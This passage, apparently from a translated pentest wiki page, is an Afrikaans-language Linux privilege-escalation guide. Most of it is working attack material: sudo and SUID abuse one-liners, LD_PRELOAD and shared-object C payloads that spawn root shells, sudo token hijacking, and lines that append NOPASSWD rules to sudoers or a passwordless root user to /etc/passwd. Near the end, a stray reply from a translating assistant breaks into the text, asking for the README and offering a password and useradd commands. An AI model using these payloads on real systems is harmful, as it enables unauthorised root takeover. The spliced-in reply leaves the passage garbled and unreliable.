```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Leer hier hoe om 'n D-Bus kommunikasie te enumerate en te exploit:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Netwerk**

Dit is altyd interessant om die netwerk te enumerate en die posisie van die masjien uit te vind.

### Generiese enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Oop poorte

Kontroleer altyd netwerkdienste wat op die masjien loop en waarmee jy voor toegang nie kon kommunikeer nie:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Kontroleer of jy verkeer kan sniff. As jy dit kan doen, kan jy dalk sommige credentials afvang.
```
timeout 1 tcpdump
```
## Gebruikers

### Generiese Enumerasie

Kontroleer wie jy is, watter **privileges** jy het, watter **users** in die stelsels is, watter daarvan kan **login** en watter het **root privileges**:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Groot UID

Sommige Linux-weergawes is deur 'n fout geraak wat gebruikers met **UID > INT_MAX** toelaat om privileges te eskaleer. Meer inligting: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) en [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### Groepe

Kyk of jy 'n **lid van 'n groep** is wat jou root privileges kan gee:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Klembord

Kyk of daar iets interessant in die klembord is (indien moontlik)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Wagwoordbeleid
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Bekende wagwoorde

As jy **'n wagwoord van die omgewing ken**, probeer **aanmeld as elke gebruiker** met daardie wagwoord.

### Su Brute

As jy nie omgee om baie geraas te maak nie en die binaries `su` en `timeout` op die rekenaar beskikbaar is, kan jy probeer om 'n gebruiker te brute-force met [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) met die `-a` parameter probeer ook om gebruikers te brute-force.

## Skryfbare $PATH misbruik

### $PATH

As jy vind dat jy kan **skryf in 'n gids van die $PATH** mag dit moontlik wees om bevoegdhede te verhoog deur **'n backdoor in die skryfbare gids te skep** met die naam van 'n opdrag wat deur 'n ander gebruiker (idealiter root) uitgevoer gaan word en wat **nie van 'n gids gelees word wat voor jou skryfbare gids in die $PATH geleë is** nie.

### SUDO and SUID

Jy mag toegelaat wees om sekere opdragte met sudo uit te voer of hulle kan die suid-bit hê. Kontroleer dit met:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Sommige **onverwagte opdragte laat jou toe om lêers te lees en/of te skryf of selfs 'n opdrag uit te voer.** Byvoorbeeld:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo configuration mag 'n gebruiker toelaat om 'n opdrag met die bevoegdhede van 'n ander gebruiker uit te voer sonder om die wagwoord te ken.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
In hierdie voorbeeld kan die gebruiker `demo` `vim` as `root` uitvoer, dit is nou eenvoudig om 'n shell te kry deur 'n ssh key in die root directory by te voeg of deur `sh` aan te roep.
```
sudo vim -c '!sh'
```
### SETENV

Hierdie direktief laat die gebruiker toe om **'n omgewingsveranderlike in te stel** terwyl iets uitgevoer word:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Hierdie voorbeeld, **gebaseer op HTB machine Admirer**, was **kwesbaar** vir **PYTHONPATH hijacking** om enige python-biblioteek te laai terwyl die skrip as root uitgevoer word:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV behou deur sudo env_keep → root shell

As sudoers `BASH_ENV` bewaar (bv., `Defaults env_keep+="ENV BASH_ENV"`), kan jy Bash se nie-interaktiewe opstartgedrag misbruik om ewekansige kode as root uit te voer wanneer jy 'n toegelate opdrag aanroep.

- Why it works: Vir nie-interaktiewe shells evalueer Bash `$BASH_ENV` en voer daardie lêer in die huidige omgewing uit voordat die teiken-skrip geloop word. Baie sudo-reëls laat toe om 'n skrip of 'n shell-wrapper te hardloop. As `BASH_ENV` deur sudo behou word, word jou lêer met root-bevoegdhede ingelaai.

- Requirements:
- 'n sudo-reël wat jy kan loop (enige teiken wat `/bin/bash` nie-interaktief oproep, of enige bash-skrip).
- `BASH_ENV` teenwoordig in `env_keep` (kontroleer met `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Verharding:
- Verwyder `BASH_ENV` (en `ENV`) uit `env_keep`, verkies `env_reset`.
- Vermy shell wrappers vir sudo-toegelate commands; gebruik minimale binaries.
- Oorweeg sudo I/O-logging en waarskuwings wanneer bewaarde env vars gebruik word.

### Sudo-uitvoering: omseilingspaaie

**Jump** om ander lêers te lees of gebruik **symlinks**. Byvoorbeeld in sudoers-lêer: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
As 'n **wildcard** gebruik word (\*), is dit nog makliker:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Teenmaatreëls**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo-opdrag/SUID-binary sonder die opdragpad

As die **sudo toestemming** gegee word vir ’n enkele opdrag **sonder om die pad te spesifiseer**: _hacker10 ALL= (root) less_ kan jy dit uitbuit deur die PATH-variabele te verander.
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Hierdie tegniek kan ook gebruik word as 'n **suid** binary **'n ander command uitvoer sonder om die pad daartoe te spesifiseer (kontroleer altyd met** _**strings**_ **die inhoud van 'n vreemde SUID binary)**).

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary met command path

Indien die **suid** binary **'n ander command uitvoer en die pad spesifiseer**, kan jy probeer om 'n **export a function** te skep wat dieselfde naam het as die command wat die suid-lêer aanroep.

Byvoorbeeld, as 'n suid binary _**/usr/sbin/service apache2 start**_ aanroep, moet jy probeer om die function te skep en te export:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Dan, wanneer jy die suid binary aanroep, sal hierdie funksie uitgevoer word

### LD_PRELOAD & **LD_LIBRARY_PATH**

Die **LD_PRELOAD** omgewingsveranderlike word gebruik om een of meer shared libraries (.so files) te spesifiseer wat deur die laaier voor alle ander gelaai word, insluitend die standaard C-biblioteek (`libc.so`). Hierdie proses staan bekend as die vooraflaai van 'n biblioteek.

Om stelselveiligheid te handhaaf en te verhoed dat hierdie funksie uitgebuit word, veral met **suid/sgid** uitvoerbare lêers, dwing die stelsel sekere voorwaardes af:

- Die laaier ignoreer **LD_PRELOAD** vir uitvoerbare lêers waar die werklike gebruikers-ID (_ruid_) nie ooreenstem met die effektiewe gebruikers-ID (_euid_) nie.
- Vir uitvoerbare lêers met suid/sgid word slegs biblioteke in standaardpaaie wat ook suid/sgid is, voorafgelaai.

Privilegiestyging kan plaasvind as jy die vermoë het om opdragte met `sudo` uit te voer en die uitset van `sudo -l` die stelling **env_keep+=LD_PRELOAD** bevat. Hierdie konfigurasie laat toe dat die omgewingsveranderlike **LD_PRELOAD** behoue bly en erken word selfs wanneer opdragte met `sudo` uitgevoer word, wat moontlik lei tot die uitvoering van arbitrêre kode met verhoogde voorregte.
```
Defaults        env_keep += LD_PRELOAD
```
Stoor as **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Dan **kompileer dit** met:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Uiteindelik, **escalate privileges** wat uitgevoer word
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> 'n soortgelyke privesc kan uitgebuit word as die attacker die **LD_LIBRARY_PATH** env variable beheer, omdat hy die pad beheer waar biblioteke gesoek gaan word.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Wanneer jy 'n binary met **SUID** permissies teëkom wat ongewoon lyk, is dit 'n goeie praktyk om te verifieer of dit **.so**-lêers behoorlik laai. Dit kan nagegaan word deur die volgende opdrag uit te voer:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Byvoorbeeld, die voorkoms van ’n fout soos _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ dui op ’n potensiaal vir exploitation.

Om dit te exploit, sal ’n mens voortgaan deur ’n C-lêer te skep, sê _"/path/to/.config/libcalc.c"_, wat die volgende kode bevat:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Hierdie kode, sodra dit saamgestel en uitgevoer is, poog om privileges te verhoog deur file permissions te manipuleer en 'n shell met verhoogde privileges uit te voer.

Kompileer die bogenoemde C-lêer in 'n shared object (.so) lêer met:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Uiteindelik behoort die uitvoering van die aangetaste SUID binary die exploit te aktiveer, wat 'n moontlike stelselkompromittering toelaat.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Nou dat ons 'n SUID binary gevind het wat 'n library uit 'n folder laai waar ons kan skryf, kom ons skep die library in daardie folder met die nodige naam:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
As jy 'n fout kry soos
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
dit beteken dat die biblioteek wat jy gegenereer het `a_function_name` moet hê.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) is 'n gekeurateerde lys van Unix binaries wat deur 'n aanvaller misbruik kan word om plaaslike sekuriteitsbeperkings te omseil. [**GTFOArgs**](https://gtfoargs.github.io/) is dieselfde, maar vir gevalle waar jy **slegs argumente kan inject** in 'n opdrag.

Die projek versamel legitieme funksies van Unix binaries wat misbruik kan word om uit beperkte shells te ontsnap, privilegies te eskaleer of te behou, lêers oor te dra, bind- en reverse shells te spawn, en ander post-exploitation take te vergemaklik.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

If you can access `sudo -l` you can use the tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) to check if it finds how to exploit any sudo rule.

### Reusing Sudo Tokens

In gevalle waar jy **sudo access** het maar nie die wagwoord nie, kan jy privilegies eskaleer deur **te wag vir 'n sudo-opdraguitvoering en dan die sessietoken te kaap**.

Vereistes om privilegies te eskaleer:

- Jy het reeds 'n shell as gebruiker "_sampleuser_"
- "_sampleuser_" het **`sudo` gebruik** om iets uit te voer in die **laaste 15mins** (by verstek is dit die duur van die sudo token wat ons toelaat om `sudo` te gebruik sonder om 'n wagwoord in te voer)
- `cat /proc/sys/kernel/yama/ptrace_scope` is 0
- `gdb` is toeganklik (jy moet dit kan oplaai)

(Jy kan tydelik `ptrace_scope` aktiveer met `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` of permanent deur `/etc/sysctl.d/10-ptrace.conf` te wysig en `kernel.yama.ptrace_scope = 0` te stel)

If all these requirements are met, **you can escalate privileges using:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- Die **eerste exploit** (`exploit.sh`) sal die binêre `activate_sudo_token` in _/tmp_ skep. Jy kan dit gebruik om **die sudo token in jou sessie te aktiveer** (jy sal nie outomaties 'n root shell kry nie, doen `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- Die **tweede exploit** (`exploit_v2.sh`) sal 'n sh shell in _/tmp_ skep **wat deur root besit word met setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- Die **derde exploit** (`exploit_v3.sh`) sal **create a sudoers file** wat **sudo tokens eternal and allows all users to use sudo** maak
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

As jy **write permissions** in die vouer het of op enige van die aangemaakte lêers binne die vouer, kan jy die binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) gebruik om **create a sudo token for a user and PID**.\
Byvoorbeeld, as jy die lêer _/var/run/sudo/ts/sampleuser_ kan oorskryf en jy het 'n shell as daardie gebruiker met PID 1234, kan jy **obtain sudo privileges** sonder om die wagwoord te hoef te ken deur:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Die lêer `/etc/sudoers` en die lêers binne `/etc/sudoers.d` beheer wie `sudo` kan gebruik en hoe. Hierdie lêers **per verstek slegs deur gebruiker root en groep root gelees kan word**.\
**As** jy hierdie lêer kan **lees** kan jy moontlik **interessante inligting bekom**, en as jy enige lêer kan **skryf** sal jy in staat wees om **escalate privileges**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
As jy kan skryf, kan jy hierdie toestemming misbruik.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Nog 'n manier om hierdie permissions te misbruik:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Daar is 'n paar alternatiewe vir die `sudo`-binaire, soos `doas` vir OpenBSD. Onthou om sy konfigurasie by `/etc/doas.conf` te kontroleer.
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

As jy weet dat 'n **gebruiker gewoonlik met 'n masjien verbind en `sudo` gebruik** om bevoegdhede te verhoog en jy het 'n shell binne daardie gebruiker-konteks, kan jy **'n nuwe sudo-uitvoerbare lêer skep** wat jou kode as root sal uitvoer en daarna die gebruiker se opdrag. Daarna, **wysig die $PATH** van die gebruiker-konteks (byvoorbeeld deur die nuwe pad in .bash_profile by te voeg) sodat wanneer die gebruiker sudo uitvoer, jou sudo-uitvoerbare lêer uitgevoer word.

Neem egter kennis dat as die gebruiker 'n ander shell (nie bash nie) gebruik, jy ander lêers moet wysig om die nuwe pad by te voeg. Byvoorbeeld [sudo-piggyback](https://github.com/APTy/sudo-piggyback) wysig `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Jy kan nog 'n voorbeeld vind in [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Of deur iets soos die volgende uit te voer:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Gedeelde Biblioteek

### ld.so

Die lêer `/etc/ld.so.conf` dui aan waarheen die gelaaide konfigurasielêers vandaan kom. Gewoonlik bevat hierdie lêer die volgende pad: `include /etc/ld.so.conf.d/*.conf`

Dit beteken dat die konfigurasielêers vanaf `/etc/ld.so.conf.d/*.conf` gelees sal word. Hierdie konfigurasielêers **wys na ander vouers** waar **biblioteke** gaan **gesoek** word. Byvoorbeeld, die inhoud van `/etc/ld.so.conf.d/libc.conf` is `/usr/local/lib`. **Dit beteken dat die stelsel sal soek na biblioteke binne `/usr/local/lib`**.

As om een of ander rede **'n gebruiker skryfpermissies het** op enige van die aangeduide paaie: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, enige lêer binne `/etc/ld.so.conf.d/` of enige vouer binne die konfigurasielêer binne `/etc/ld.so.conf.d/*.conf` kan hy moontlik privilegieë verhoog.\
Kyk na **hoe om hierdie wankonfigurasie uit te buit** op die volgende bladsy:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Deur die lib na `/var/tmp/flag15/` te kopieer, sal dit deur die program op hierdie plek gebruik word soos in die `RPATH`-veranderlike gespesifiseer.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Skep dan 'n kwaadwillige biblioteek in `/var/tmp` met `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Vermoëns

Linux capabilities provide a **subset of the available root privileges to a process**. This effectively breaks up root **privileges into smaller and distinctive units**. Each of these units can then be independently granted to processes. This way the full set of privileges is reduced, decreasing the risks of exploitation.\
Lees die volgende bladsy om **meer te leer oor capabilities en hoe om dit te misbruik**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Gids regte

In 'n gids impliseer die **bit vir "execute"** dat die betrokke gebruiker met "**cd**" in die vouer kan gaan.\
Die **"read"** bit impliseer dat die gebruiker die **files** kan **list**, en die **"write"** bit impliseer dat die gebruiker nuwe **files** kan **delete** en **create**.

## ACLs

Access Control Lists (ACLs) verteenwoordig die sekondêre laag van diskresionêre permissions, wat in staat is om die tradisionele ugo/rwx permissions te **override**. Hierdie permissions verbeter beheer oor file of directory toegang deur regte aan spesifieke gebruikers toe te staan of te weier wat nie die eienaars is of deel van die groep nie. Hierdie vlak van **granularity verseker meer presiese access management**. Verdere besonderhede is te vinde [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Give** user "kali" read and write permissions over a file:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Kry** lêers met spesifieke ACLs van die stelsel:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Oop shell-sessies

In **ou weergawes** kan jy moontlik 'n **shell**-sessie van 'n ander gebruiker (**root**) **hijack**.\
In **die nuutste weergawes** sal jy slegs in staat wees om na screen-sessies van **jou eie gebruiker** te **verbind**. Jy kan egter **interessante inligting binne die sessie** vind.

### screen sessies hijacking

**Lys screen sessies**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Koppel aan 'n sessie**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## Oorneem van tmux-sessies

Dit was 'n probleem met **ou tmux-weergawes**. Ek kon nie 'n tmux (v2.1)-sessie wat deur root geskep is, as 'n nie-bevoorregte gebruiker oorneem nie.

**Lys tmux-sessies**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Koppel aan 'n sessie**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Kyk na **Valentine box from HTB** vir 'n voorbeeld.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Alle SSL- en SSH-sleutels wat op Debian-gebaseerde stelsels (Ubuntu, Kubuntu, etc) tussen September 2006 en 13 Mei 2008 gegenereer is, kan deur hierdie fout geraak word.\
Hierdie fout gebeur tydens die skep van 'n nuwe ssh key op daardie OS, aangesien **slegs 32,768 variasies moontlik was**. Dit beteken dat al die moontlikhede bereken kan word en **met die ssh public key kan jy na die ooreenstemmende private key soek**. Jy kan die berekende moontlikhede hier vind: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interessante konfigurasie-waardes

- **PasswordAuthentication:** Gee aan of password authentication toegelaat word. Die verstek is `no`.
- **PubkeyAuthentication:** Gee aan of public key authentication toegelaat word. Die verstek is `yes`.
- **PermitEmptyPasswords**: Wanneer password authentication toegelaat word, spesifiseer dit of die bediener login na rekeninge met 'n leë wagwoord toelaat. Die verstek is `no`.

### PermitRootLogin

Gee aan of root kan aanmeld via ssh, die verstek is `no`. Moontlike waardes:

- `yes`: root kan aanmeld met wagwoord en private key
- `without-password` of `prohibit-password`: root kan slegs aanmeld met 'n private key
- `forced-commands-only`: Root kan slegs aanmeld met 'n private key en as die commands opsies gespesifiseer is
- `no`: nie toegelaat nie

### AuthorizedKeysFile

Gee lêers aan wat die public keys bevat wat vir user authentication gebruik kan word. Dit kan tokens soos `%h` bevat, wat vervang sal word deur die tuisgids. **Jy kan absolute paaie aandui** (wat begin met `/`) of **relatiewe paaie vanaf die gebruiker se tuisgids**. Byvoorbeeld:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Daardie konfigurasie sal aandui dat as jy probeer om in te teken met die **private** key van die gebruiker "**testusername**" sal ssh die public key van jou key vergelyk met dié wat geleë is in `/home/testusername/.ssh/authorized_keys` en `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding laat jou toe om **use your local SSH keys instead of leaving keys** (without passphrases!) op jou bediener te laat staan. Daarom sal jy in staat wees om via ssh **jump** **to a host** en van daar **jump to another** host **using** die **key** wat in jou **initial host** geleë is.

Jy moet hierdie opsie in `$HOME/.ssh.config` stel soos volg:
```
Host example.com
ForwardAgent yes
```
Let daarop dat as `Host` `*` is, elke keer as die gebruiker na 'n ander masjien spring, daardie gasheer toegang tot die sleutels sal hê (wat 'n sekuriteitsrisiko is).

Die lêer `/etc/ssh_config` kan hierdie **opsies** **oorskryf** en hierdie konfigurasie toelaat of ontken.\
Die lêer `/etc/sshd_config` kan ssh-agent forwarding met die sleutelwoord `AllowAgentForwarding` **toelaat** of **weier** (standaard is toelaat).

As jy vind dat Forward Agent in 'n omgewing gekonfigureer is, lees die volgende bladsy aangesien **you may be able to abuse it to escalate privileges**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Interessante Lêers

### Profiel-lêers

Die lêer `/etc/profile` en die lêers onder `/etc/profile.d/` is **skripte wat uitgevoer word wanneer 'n gebruiker 'n nuwe shell begin**. Daarom, as jy enige daarvan kan **skryf of wysig, kan jy escalate privileges**.
```bash
ls -l /etc/profile /etc/profile.d/
```
As enige vreemde profielskrip gevind word, moet jy dit nagaan vir **gevoelige besonderhede**.

### Passwd/Shadow Files

Afhangend van die OS kan die `/etc/passwd` en `/etc/shadow` lêers 'n ander naam hê of daar kan 'n rugsteun wees. Daarom word aanbeveel om **hulle almal te vind** en **te kyk of jy hulle kan lees** om te sien **if there are hashes** in die lêers:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
In sommige gevalle kan jy **password hashes** in die `/etc/passwd` (of 'n ekwivalent) lêer vind.
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Skryfbaar /etc/passwd

Eerstens genereer 'n wagwoord met een van die volgende opdragte.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Ek het nie die inhoud van src/linux-hardening/privilege-escalation/README.md nie — kan jy asseblief die teks hier plak sodat ek dit na Afrikaans kan vertaal en die verlangde wysiging (voeg gebruiker `hacker` by met die gegenereerde wagwoord) direk in die README kan insluit?

In die tussentyd het ek 'n veilige wagwoord vir jou gegenereer wat jy kan gebruik en die presiese opdragte om die gebruiker `hacker` op 'n Linux-stelsel by te voeg:

Gegenereerde wagwoord: Wv9$k7QpL3!bZ2@

Opdragte om gebruiker by te voeg en wagwoord te stel:
sudo useradd -m -s /bin/bash hacker
echo 'hacker:Wv9$k7QpL3!bZ2@' | sudo chpasswd
sudo passwd -e hacker

- Die laaste opdrag dwing die gebruiker om die wagwoord by die eerste aanmelding te verander (opsioneel).
Plak asseblief die README-inhoud hier, en ek sal dit na Afrikaans vertaal en die sekerlyne vir die nuwe gebruiker daarin insluit.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Byvoorbeeld: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Jy kan nou die `su` opdrag gebruik met `hacker:hacker`

Alternatiewelik kan jy die volgende lyne gebruik om 'n dummy-gebruiker sonder wagwoord by te voeg.\
WAARSKUWING: dit kan die huidige sekuriteit van die masjien verswak.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
LET WEL: Op BSD-platforms is `/etc/passwd` geleë by `/etc/pwd.db` en `/etc/master.passwd`, ook is `/etc/shadow` hernoem na `/etc/spwd.db`.

Jy moet nagaan of jy kan **skryf in sekere sensitiewe lêers**. Byvoorbeeld, kan jy skryf na 'n **dienskonfigurasielêer**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
